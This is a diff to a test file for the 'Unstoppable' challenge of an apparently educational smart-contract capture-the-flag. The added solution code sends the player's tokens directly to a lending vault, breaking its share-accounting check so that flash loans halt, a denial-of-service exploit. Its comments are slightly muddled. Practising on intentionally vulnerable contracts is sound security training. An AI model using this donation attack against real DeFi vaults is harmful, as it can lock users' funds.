@@ -37,6 +37,7 @@ describe('[Challenge] Unstoppable', function () {
         expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);
 
         // Show it's possible for someUser to take out a flash loan
+        // Can use any other contract to hack
         receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
             vault.address
         );
@@ -44,7 +45,13 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Need to remove 1 token in order to make the ERC4626 check fail
+        // convertToShares(totalSupply) != balanceBefore
+        // ... the check fails even when a token is added
+
+        playerToken = token.connect(player);
+        await playerToken.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
+        console.log(token.balanceOf(vault.address));
     });
 
     after(async function () {
